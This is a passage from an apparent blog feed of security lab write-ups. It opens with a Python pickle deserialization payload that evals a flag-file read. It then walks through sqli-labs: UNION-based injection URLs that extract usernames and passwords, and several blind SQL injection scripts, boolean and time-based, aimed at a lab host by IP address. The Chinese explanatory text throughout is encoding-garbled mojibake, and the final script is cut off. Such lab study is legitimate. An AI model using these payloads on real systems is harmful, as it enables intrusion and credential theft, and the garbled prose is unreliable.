urllib<br><br><span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">A</span>(<span class=\"hljs-params\"><span class=\"hljs-built_in\">object</span></span>):</span><br>    <span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">__reduce__</span>(<span class=\"hljs-params\">self</span>):</span><br>        a = <span class=\"hljs-string\">&quot;open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()&quot;</span><br>        <span class=\"hljs-keyword\">return</span> (<span class=\"hljs-built_in\">eval</span>,(a,))<br>a = A()<br>test = pickle.dumps(a)<br>payload = urllib.quote(test)<br><span class=\"hljs-built_in\">print</span> payload<br></code></pre></td></tr></table></figure></li>\n</ol>\n",
            "tags": []
        },
        {
            "id": "http://blog.m1n.me/2019/10/12/Sqli-labs/",
            "url": "http://blog.m1n.me/2019/10/12/Sqli-labs/",
            "title": "Sqli-labs",
            "date_published": "2019-10-12T02:48:24.000Z",
            "content_html": "<h1 id=\"æ³¨å…¥è¯­å¥å¤‡å¿˜\"><a href=\"#æ³¨å…¥è¯­å¥å¤‡å¿˜\" class=\"headerlink\" title=\"æ³¨å…¥è¯­å¥å¤‡å¿˜\"></a>æ³¨å…¥è¯­å¥å¤‡å¿˜</h1><ol>\n<li>æŸ¥åº“åï¼š<code>select schema_name from information_schema.schemata</code></li>\n<li>æŸ¥è¡¨åï¼š<code>select table_name from information_schema.tables where table_schema=&#39;åº“å&#39;</code></li>\n<li>æŸ¥åˆ—åï¼š<code>select column_name from information_schema.columns where table_name=&#39;è¡¨å&#39;</code></li>\n<li>æŸ¥æ•°æ®ï¼š<code>select åˆ—å from åº“å.è¡¨å</code><span id=\"more\"></span>\n<h1 id=\"æ³¨æ„\"><a href=\"#æ³¨æ„\" class=\"headerlink\" title=\"æ³¨æ„\"></a>æ³¨æ„</h1></li>\n<li>å¯å°†ç”¨å¼•å·åŒ…å«çš„åº“åï¼Œè¡¨åè½¬æ¢ä¸ºåå…­è¿›åˆ¶ï¼Œé¿å…å¼•å·è¢«è¿‡æ»¤</li>\n<li>æ•°æ®è¿‡å¤šæ—¶å¯ä»¥åˆ©ç”¨limité™åˆ¶æ•°æ®æ•°é‡</li>\n<li>åŒä¸Šä¹Ÿå¯ä»¥ç”¨<code>concat</code>é“¾æ¥å¤šä¸ªæ•°æ®æˆä¸ºä¸€æ¡è¿”å›ç»“æœ</li>\n<li>â€¦</li>\n</ol>\n<h1 id=\"æ³¨å…¥ç±»å‹åˆ¤æ–­å°æŠ€å·§\"><a href=\"#æ³¨å…¥ç±»å‹åˆ¤æ–­å°æŠ€å·§\" class=\"headerlink\" title=\"æ³¨å…¥ç±»å‹åˆ¤æ–­å°æŠ€å·§\"></a>æ³¨å…¥ç±»å‹åˆ¤æ–­å°æŠ€å·§</h1><p>1å’Œ1â€æ­£å¸¸å›æ˜¾ï¼Œ1â€™æŠ¥é”™ï¼Œåˆ¤æ–­ä¸ºå­—ç¬¦å‹ï¼Œä½†æ˜¯è¿˜è¦åˆ¤æ–­æ˜¯å¦æœ‰å°æ‹¬å·ã€‚</p>\n<p>åˆ¤æ–­å°æ‹¬å·æœ‰å‡ ç§æ–¹æ³•ï¼š</p>\n<ol>\n<li>2â€™&amp;&amp;â€™1â€™=â€™1<ul>\n<li>è‹¥æŸ¥è¯¢è¯­å¥ä¸ºwhere id=â€™$idâ€™ï¼ŒæŸ¥è¯¢æ—¶æ˜¯where id=â€™2â€™&amp;&amp;â€™1â€™=â€™1â€™ï¼Œç»“æœæ˜¯where id=â€™2â€™ï¼Œå›æ˜¾ä¼šæ˜¯id=2ã€‚</li>\n<li>è‹¥æŸ¥è¯¢è¯­å¥ä¸ºwhere id=(â€˜$idâ€™)ï¼ŒæŸ¥è¯¢æ—¶æ˜¯where id=(â€˜2â€™&amp;&amp;â€™1â€™=â€™1â€™)ï¼ŒMySQL å°†â€™2â€™ä½œä¸ºäº† Bool å€¼ï¼Œç»“æœæ˜¯where id=(â€˜1â€™)ï¼Œå›æ˜¾ä¼šæ˜¯id=1ã€‚</li>\n</ul>\n</li>\n<li>1â€™)||â€™1â€™=(â€˜1<br>è‹¥æŸ¥è¯¢è¯­å¥æœ‰å°æ‹¬å·æ­£ç¡®å›æ˜¾ï¼Œè‹¥æ— å°æ‹¬å·é”™è¯¯å›æ˜¾ï¼ˆæ— å›æ˜¾ï¼‰ã€‚</li>\n</ol>\n<h1 id=\"sqli-labsæµ‹è¯•\"><a href=\"#sqli-labsæµ‹è¯•\" class=\"headerlink\" title=\"sqli-labsæµ‹è¯•\"></a>sqli-labsæµ‹è¯•</h1><h2 id=\"Less-1\"><a href=\"#Less-1\" class=\"headerlink\" title=\"Less-1\"></a>Less-1</h2><ol>\n<li>æ„é€ <code>127.0.0.1/Less-1/?id=1</code>æˆåŠŸè¿”å›æ•°æ®</li>\n<li>æ„é€ <code>127.0.0.1/Less-1/?id=1&#39;</code>å‡ºç°æŠ¥é”™è¯´æ˜å­˜åœ¨æ³¨å…¥ç‚¹</li>\n<li>æ„é€ <code>127.0.0.1/Less-1/?id=1&#39; order by 3--+</code>æµ‹è¯•æœ‰å‡ åˆ—</li>\n<li>æ„é€ <code>127.0.0.1/Less-1/?id=-1&#39; union select 1,2,3--+</code>æŸ¥çœ‹å›æ˜¾ç‚¹//æ­¤æ—¶éœ€è¦ä»¤æŸ¥è¯¢çš„idä¸å­˜åœ¨<br><img src=\"https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/Sqli-labs/1.png\" alt=\"sql\"></li>\n<li>æ„é€ <code>127.0.0.1/Less-1/?id=-1&#39; union select 1,2,(select schema_name from information_schema.schemata)--+</code>æŸ¥è¯¢æ•°æ®åº“åã€‚å‘ç°æŠ¥é”™è¯´æ•°æ®è¿‡å¤šï¼Œæ­¤æ—¶å°±å¯ä»¥åˆ©ç”¨limitæ„é€ ï¼š<code>127.0.0.1/Less-1/?id=-1&#39; union select 1,2,(select schema_name from information_schema.schemata limit 0,1)--+</code>ä¾æ¬¡è¿›è¡ŒæŸ¥çœ‹ã€‚<br><img src=\"https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/Sqli-labs/2.png\" alt=\"sql\"><br>æˆ–è€…å¯ä»¥åˆ©ç”¨<code>group_concat</code>æ„é€ ï¼š<code>?id=-1&#39; union select 1,2,(select group_concat(schema_name) from information_schema.schemata)--+</code><br><img src=\"https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/Sqli-labs/3.png\" alt=\"sql\"></li>\n<li>æ„é€ ï¼š<code>127.0.0.1/Less-1/?id=-1&#39; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;)--+</code>æŸ¥è¯¢è¡¨å<br>æ­¤æ—¶â€˜securityâ€™å¯ä»¥ç”¨åå…­è¿›åˆ¶æ›¿æ¢ï¼Œæˆ–è€…ç”¨database()<br><img src=\"https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/Sqli-labs/4.png\" alt=\"sql\"></li>\n<li>æ„é€ ï¼š<code>127.0.0.1/Less-1/?id=-1&#39; union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;)--+</code>æŸ¥è¯¢æ®µå<br><img src=\"https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/Sqli-labs/5.png\" alt=\"sql\"></li>\n<li>æ„é€ ï¼š<code>?id=-1&#39; union select 1,2,(select concat_ws(0x7e,username,password) from security.users limit 0,1)--+</code>æŸ¥è¯¢æ•°æ®<br><img src=\"https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/Sqli-labs/6.png\" alt=\"sql\"><br>ä¹Ÿå¯ä»¥æ„é€ ï¼š<code>?id=-1&#39; union select 1,2,(select group_concat(username,0x7e,password) from security.users)--+</code>æŸ¥è¯¢æ•°æ®<br><img src=\"https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/Sqli-labs/7.png\" alt=\"sql\"></li>\n</ol>\n<p>è‡³æ­¤ï¼Œsqli-labsçš„ç¬¬ä¸€å…³å°±ç®—æ˜¯ç»“æŸäº†</p>\n<h2 id=\"Less-2\"><a href=\"#Less-2\" class=\"headerlink\" title=\"Less-2\"></a>Less-2</h2><p>è¿™ä¸€å…³æ€»ä½“å’Œç¬¬ä¸€å…³æ˜¯ä¸€æ ·çš„ï¼Œåªæ˜¯è¿™é‡Œæ˜¯æ•´å‹æ³¨å…¥ï¼Œå› æ­¤ä¸ç”¨å•å¼•å·å»é—­åˆï¼Œå…¶ä½™æ“ä½œå’Œç¬¬ä¸€å…³ç›¸åŒ</p>\n<h2 id=\"Less-3\"><a href=\"#Less-3\" class=\"headerlink\" title=\"Less-3\"></a>Less-3</h2><p>è¿™ä¸€å…³æ˜¯åˆ©ç”¨<code>&#39;)</code>æ¥é—­åˆ</p>\n<h2 id=\"Less-4\"><a href=\"#Less-4\" class=\"headerlink\" title=\"Less-4\"></a>Less-4</h2><p>è¿™ä¸€å…³æ˜¯åˆ©ç”¨<code>&quot;)</code>æ¥é—­åˆ</p>\n<h2 id=\"Less-5\"><a href=\"#Less-5\" class=\"headerlink\" title=\"Less-5\"></a>Less-5</h2><p>è¿™å…³å¼€å§‹å°±æ˜¯ç›²æ³¨äº†ï¼Œå¹¶ä¸”é€šè¿‡åˆ¤æ–­å¯ä»¥å¾—çŸ¥è¿™æ˜¯å¸ƒå°”ç›²æ³¨<br>ç›´æ¥ä¸¢å‡ºè„šæœ¬ï¼š</p>\n<figure class=\"highlight n1ql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs n1ql\">import requests<br>import time<br><br>url = &quot;http://47.96.233.216:8080/Less-5/?id=1&#x27;&quot;<br><br>test = &quot;<span class=\"hljs-keyword\">select</span> <span class=\"hljs-keyword\">database</span>()<span class=\"hljs-string\">&quot;</span><br><span class=\"hljs-string\"></span><br><span class=\"hljs-string\">schema = &quot;</span><span class=\"hljs-keyword\">select</span> schema_name <span class=\"hljs-keyword\">from</span> information_schema.schemata <span class=\"hljs-keyword\">limit</span> <span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">1</span><span class=\"hljs-string\">&quot;</span><br><span class=\"hljs-string\"></span><br><span class=\"hljs-string\">table = &quot;</span><span class=\"hljs-keyword\">select</span> table_name <span class=\"hljs-keyword\">from</span> information_schema.tables <span class=\"hljs-keyword\">where</span> table_schema=<span class=\"hljs-keyword\">database</span>() <span class=\"hljs-keyword\">limit</span> <span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">1</span><span class=\"hljs-string\">&quot;</span><br><span class=\"hljs-string\"></span><br><span class=\"hljs-string\">column = &quot;</span><span class=\"hljs-keyword\">select</span> column_name <span class=\"hljs-keyword\">from</span> information_schema.columns <span class=\"hljs-keyword\">where</span> table_name=<span class=\"hljs-string\">&#x27;users&#x27;</span> <span class=\"hljs-keyword\">limit</span> <span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">1</span><span class=\"hljs-string\">&quot;</span><br><span class=\"hljs-string\"></span><br><span class=\"hljs-string\">data = &quot;</span><span class=\"hljs-keyword\">select</span> concat_ws(<span class=\"hljs-number\">0x5e</span>,username,<span class=\"hljs-keyword\">password</span>) <span class=\"hljs-keyword\">from</span> security.users <span class=\"hljs-keyword\">limit</span> <span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">1</span><span class=\"hljs-string\">&quot;</span><br><span class=\"hljs-string\"></span><br><span class=\"hljs-string\">result = &quot;</span><span class=\"hljs-string\">&quot;</span><br><span class=\"hljs-string\"></span><br><span class=\"hljs-string\">for i in range(1,10):</span><br><span class=\"hljs-string\">\tfor j in range(48,122):</span><br><span class=\"hljs-string\">\t\tpayload = url + &quot;</span> <span class=\"hljs-keyword\">and</span> ascii(<span class=\"hljs-built_in\">substr</span>((&#123;&#125;),&#123;&#125;,<span class=\"hljs-number\">1</span>))=&#123;&#125;--+<span class=\"hljs-string\">&quot;.format(data,i,j)</span><br><span class=\"hljs-string\">\t\t# print(payload)</span><br><span class=\"hljs-string\">\t\tr = requests.get(payload)</span><br><span class=\"hljs-string\">\t\tl = len(r.text)</span><br><span class=\"hljs-string\">\t\t# print(l)</span><br><span class=\"hljs-string\">\t\tif(l==704):</span><br><span class=\"hljs-string\">\t\t\tresult+=chr(j)</span><br><span class=\"hljs-string\">\t\t\tprint(result)</span><br><span class=\"hljs-string\">\t\t\tbreak</span><br><span class=\"hljs-string\"></span><br></code></pre></td></tr></table></figure>\n<p>è¿™ä¸ªè„šæœ¬è¿˜æ˜¯æ¯”è¾ƒåå‘æ‰‹åŠ¨åŒ–çš„ã€‚ã€‚ã€‚ã€‚</p>\n<h2 id=\"Less-6\"><a href=\"#Less-6\" class=\"headerlink\" title=\"Less-6\"></a>Less-6</h2><p>ç”¨<code>&quot;</code>é—­åˆ</p>\n<h2 id=\"Less-7\"><a href=\"#Less-7\" class=\"headerlink\" title=\"Less-7\"></a>Less-7</h2><p>ç”¨<code>&#39;))</code>é—­åˆï¼Œä½†æ˜¯æ­¤æ—¶çš„è®¾å®šæ˜¯æ— è®ºæ˜¯å¦æ­£ç¡®ï¼Œè¿”å›çš„æ•°æ®é•¿åº¦æ˜¯ä¸€æ ·çš„ã€‚æ­¤æ—¶æ”¹å˜åˆ¤æ–­æ–¹å¼ï¼š</p>\n<figure class=\"highlight n1ql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs n1ql\">import requests<br><br>url = &quot;http://47.96.233.216:8080/Less-7/?id=1&#x27;))&quot;<br><br>test = &quot;<span class=\"hljs-keyword\">select</span> <span class=\"hljs-keyword\">database</span>()<span class=\"hljs-string\">&quot;</span><br><span class=\"hljs-string\"></span><br><span class=\"hljs-string\">schema = &quot;</span><span class=\"hljs-keyword\">select</span> schema_name <span class=\"hljs-keyword\">from</span> information_schema.schemata <span class=\"hljs-keyword\">limit</span> <span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">1</span><span class=\"hljs-string\">&quot;</span><br><span class=\"hljs-string\"></span><br><span class=\"hljs-string\">table = &quot;</span><span class=\"hljs-keyword\">select</span> table_name <span class=\"hljs-keyword\">from</span> information_schema.tables <span class=\"hljs-keyword\">where</span> table_schema=<span class=\"hljs-keyword\">database</span>() <span class=\"hljs-keyword\">limit</span> <span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">1</span><span class=\"hljs-string\">&quot;</span><br><span class=\"hljs-string\"></span><br><span class=\"hljs-string\">column = &quot;</span><span class=\"hljs-keyword\">select</span> column_name <span class=\"hljs-keyword\">from</span> information_schema.columns <span class=\"hljs-keyword\">where</span> table_name=<span class=\"hljs-string\">&#x27;users&#x27;</span> <span class=\"hljs-keyword\">limit</span> <span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">1</span><span class=\"hljs-string\">&quot;</span><br><span class=\"hljs-string\"></span><br><span class=\"hljs-string\">data = &quot;</span><span class=\"hljs-keyword\">select</span> concat_ws(<span class=\"hljs-number\">0x5e</span>,username,<span class=\"hljs-keyword\">password</span>) <span class=\"hljs-keyword\">from</span> security.users <span class=\"hljs-keyword\">limit</span> <span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">1</span><span class=\"hljs-string\">&quot;</span><br><span class=\"hljs-string\"></span><br><span class=\"hljs-string\">result = &quot;</span><span class=\"hljs-string\">&quot;</span><br><span class=\"hljs-string\"></span><br><span class=\"hljs-string\">for i in range(1,10):</span><br><span class=\"hljs-string\">\tfor j in range(48,122):</span><br><span class=\"hljs-string\">\t\tpayload = url + &quot;</span> <span class=\"hljs-keyword\">and</span> ascii(<span class=\"hljs-built_in\">substr</span>((&#123;&#125;),&#123;&#125;,<span class=\"hljs-number\">1</span>))=&#123;&#125;--+<span class=\"hljs-string\">&quot;.format(test,i,j)</span><br><span class=\"hljs-string\">\t\tr = requests.get(payload)</span><br><span class=\"hljs-string\">\t\ttxt = r.text</span><br><span class=\"hljs-string\">\t\tl = len(r.text)</span><br><span class=\"hljs-string\">\t\ts = &quot;</span>You are <span class=\"hljs-keyword\">in</span>.... <span class=\"hljs-keyword\">Use</span> outfile......<span class=\"hljs-string\">&quot;</span><br><span class=\"hljs-string\">\t\tif(s in txt):</span><br><span class=\"hljs-string\">\t\t\tresult+=chr(j)</span><br><span class=\"hljs-string\">\t\t\tprint(result)</span><br><span class=\"hljs-string\">\t\t\tbreak</span><br><span class=\"hljs-string\"></span><br></code></pre></td></tr></table></figure>\n<h2 id=\"Less-8\"><a href=\"#Less-8\" class=\"headerlink\" title=\"Less-8\"></a>Less-8</h2><p>è¿™ä¸€å…³çš„é—­åˆæ–¹å¼è¿˜æ˜¯å•å¼•å·ï¼Œè€Œä¸”å¥½åƒå’Œç¬¬äº”å…³æ²¡å•¥å·®åˆ«ï¼Ÿï¼Ÿï¼Ÿåªè¦æ”¹ä¸€ä¸‹è¿”å›æ•°æ®é•¿åº¦è„šæœ¬ä¸€æ ·æ˜¯å¯ä»¥ç”¨çš„ï¼Ÿï¼Ÿ</p>\n<h2 id=\"Less-9\"><a href=\"#Less-9\" class=\"headerlink\" title=\"Less-9\"></a>Less-9</h2><p>é€šè¿‡æµ‹è¯•æˆ‘ä»¬å¯ä»¥å‘ç°æ— è®ºæ‰€æŸ¥è¯¢çš„æ•°æ®æ˜¯å¦å­˜åœ¨ï¼Œéƒ½ä¼šè¿”å›â€You are inâ€¦.â€œï¼Œå¯ä»¥æ¨æ–­è¿™æ¬¡ä¸æ˜¯å¸ƒå°”ç›²æ³¨è€Œæ˜¯æ—¶é—´ç›²æ³¨ã€‚ä¸¢å‡ºæ—¶é—´ç›²æ³¨çš„è„šæœ¬ï¼š</p>\n<figure class=\"highlight n1ql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs n1ql\">import requests<br>import time<br><br>url = &quot;http://47.96.233.216:8080/Less-9/?id=1&#x27;&quot;<br><br>test = &quot;<span class=\"hljs-keyword\">select</span> <span class=\"hljs-keyword\">database</span>()<span class=\"hljs-string\">&quot;</span><br><span class=\"hljs-string\"></span><br><span class=\"hljs-string\">schema = &quot;</span><span class=\"hljs-keyword\">select</span> schema_name <span class=\"hljs-keyword\">from</span> information_schema.schemata <span class=\"hljs-keyword\">limit</span> <span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">1</span><span class=\"hljs-string\">&quot;</span><br><span class=\"hljs-string\"></span><br><span class=\"hljs-string\">table = &quot;</span><span class=\"hljs-keyword\">select</span> table_name <span class=\"hljs-keyword\">from</span> information_schema.tables <span class=\"hljs-keyword\">where</span> table_schema=<span class=\"hljs-keyword\">database</span>() <span class=\"hljs-keyword\">limit</span> <span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">1</span><span class=\"hljs-string\">&quot;</span><br><span class=\"hljs-string\"></span><br><span class=\"hljs-string\">column = &quot;</span><span class=\"hljs-keyword\">select</span> column_name <span class=\"hljs-keyword\">from</span> information_schema.columns <span class=\"hljs-keyword\">where</span> table_name=<span class=\"hljs-string\">&#x27;users&#x27;</span> <span class=\"hljs-keyword\">limit</span> <span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">1</span><span class=\"hljs-string\">&quot;</span><br><span class=\"hljs-string\"></span><br><span class=\"hljs-string\">data = &quot;</span><span class=\"hljs-keyword\">select</span> concat_ws(<span class=\"hljs-number\">0x5e</span>,username,<span class=\"hljs-keyword\">password</span>) <span class=\"hljs-keyword\">from</span> security.users <span class=\"hljs-keyword\">limit</span> <span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">1</span><span class=\"hljs-string\">&quot;</span><br><span class=\"hljs-string\"></span><br><span class=\"hljs-string\">result = &quot;</span><span class=\"hljs-string\">&quot;</span><br><span class=\"hljs-string\"></span><br><span class=\"hljs-string\">for i in range(1,10):</span><br><span class=\"hljs-string\">\tfor j in range(48,122):(test,i,j)</span><br><span class=\"hljs-string\">\t\tpayload = url + &quot;</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-keyword\">if</span>(ascii(<span class=\"hljs-built_in\">substr</span>((&#123;&#125;),&#123;&#125;,<span class=\"hljs-number\">1</span>))=&#123;&#125;,sleep(<span class=\"hljs-number\">2</span>),<span class=\"hljs-number\">1</span>)--+<span class=\"hljs-string\">&quot;.format(data,i,j)</span><br><span class=\"hljs-string\">\t\tt1 = time.time()</span><br><span class=\"hljs-string\">\t\tr = requests.get(payload)</span><br><span class=\"hljs-string\">\t\tt2 = time.time()</span><br><span class=\"hljs-string\">\t\tif(t2-t1&gt;=2):</span><br><span class=\"hljs-string\">\t\t\tresult+=chr(j)</span><br><span class=\"hljs-string\">\t\t\tprint(result)</span><br><span class=\"hljs-string\">\t\t\tbreak</span><br><span class=\"hljs-string\"></span><br></code></pre></td></tr></table></figure>\n<h2 id=\"Less-10\"><a href=\"#Less-10\" class=\"headerlink\" title=\"Less-10\"></a>Less-10</h2><p>ç”¨<code>&quot;</code>é—­åˆ</p>\n<h2 id=\"Less-11\"><a href=\"#Less-11\" class=\"headerlink\" title=\"Less-11\"></a>Less-11</h2><p>ç”±äºè¯·æ±‚æ–¹å¼æ˜¯postï¼Œå› æ­¤è¦ç”¨BurpSuitæŠ“åŒ…ï¼Œå¯ä»¥å‘ç°è´¦å·å¯†ç å¤„å­˜åœ¨æ³¨å…¥ç‚¹<br><img src=\"https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/Sqli-labs/8.png\" alt=\"sql\"><br>#Less-12<br>åŒä¸Šï¼Œç”¨<code>&quot;)</code>é—­åˆ<br>#Less-13<br>å¯ä»¥å‘ç°é¡µé¢æ²¡æœ‰å›æ˜¾ï¼Œé€šè¿‡è¿”å›å›¾ç‰‡çš„ä¸åŒå¯ä»¥å‘ç°æ˜¯boolç›²æ³¨ï¼Œè€Œä¸”æ—¶é—´ç›²æ³¨åº”è¯¥æ˜¯å¯ä»¥çš„ï¼Œä½†æ˜¯ç”±äºè¿”å›çš„æ•°æ®åŒ…ä¸åŒç‚¹æ˜¯å›¾ç‰‡ä¸ç›¸åŒï¼Œä¸èƒ½é€šè¿‡åˆ¤æ–­é•¿åº¦è¿›è¡Œå¸ƒå°”ç›²æ³¨ï¼Œå¯ä»¥ç”¨<code>if(s in r.txt)</code>è¿›è¡Œåˆ¤æ–­<br>å…ˆæ”¾ä¸€ä¸‹è„šæœ¬ï¼š</p>\n<figure class=\"highlight nix\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs nix\"><span class=\"hljs-built_in\">import</span> requests<br><br><span class=\"hljs-attr\">url</span> = <span class=\"hljs-string\">&quot;http://47.96.233.216:8080/Less-13/&quot;</span><br><br><span class=\"hljs-attr\">test</span> = <span class=\"hljs-string\">&quot;select database()&quot;</span><br><br><span class=\"hljs-attr\">schema</span> = <span class=\"hljs-string\">&quot;select schema_name from information_schema.schemata limit 0,1&quot;</span><br><br><span class=\"hljs-attr\">table</span> = <span class=\"hljs-string\">&quot;select table_name from information_schema.tables where table_schema=database() limit 1,1&quot;</span><br><br><span class=\"hljs-attr\">column</span> = <span class=\"hljs-string\">&quot;select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1&quot;</span><br><br><span class=\"hljs-attr\">data</span> = <span class=\"hljs-string\">&quot;select concat_ws(0x5e,username,password) from security.users limit 0,1&quot;</span><br><br><span class=\"hljs-attr\">result</span> = <span class=\"hljs-string\">&quot;&quot;</span><br><br>for i <span class=\"hljs-keyword\">in</span> range(<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">10</span>):<br>\tfor j <span class=\"hljs-keyword\">in</span> range(<span class=\"hljs-number\">48</span>,<span class=\"hljs-number\">122</span>):<br>\t\t<span class=\"hljs-attr\">payload</span> = <span class=\"hljs-string\">&quot;admin&#x27;) and ascii(substr((&#123;0&#125;),&#123;1&#125;,1))=&#123;2&#125; #&quot;</span>.format(test,i,j)<br>\t\t<span class=\"hljs-attr\">post_r</span> = &#123;<span class=\"hljs-string\">&quot;uname&quot;</span>:payload,<span class=\"hljs-string\">&quot;passwd&quot;</span>:<span class=\"hljs-string\">&quot;admin&quot;</span>&#125;<br>\t\t<span class=\"hljs-attr\">r</span> = requests.post(url,<span class=\"hljs-attr\">data=post_r)</span><br>\t\t<span class=\"hljs-attr\">l</span> = len(r.text)<br>\t\t<span class=\"hljs-attr\">txt</span> = r.text<br>\t\t<span class=\"hljs-attr\">s</span> = <span class=\"hljs-string\">&quot;../images/flag.jpg&quot;</span><br>\t\t<span class=\"hljs-keyword\">if</span> (s <span class=\"hljs-keyword\">in</span> txt):<br>\t\t\tresult+=chr(j)<br>\t\t\tprint(result)<br>\t\t\tbreak<br></code></pre></td></tr></table></figure>\n<p>ä»¥åŠä¸€ä¸ªç½‘ä¸Šæ‰¾çš„ä¸€ä¸ªè¾ƒå¥½çš„è„šæœ¬â€˜<a href=\"https://blog.csdn.net/vhkjhwbs/article/details/98960802%E2%80%99%EF%BC%9A\">https://blog.csdn.net/vhkjhwbs/article/details/98960802â€™ï¼š</a></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">import</span> requests<br> <br>chars = <span 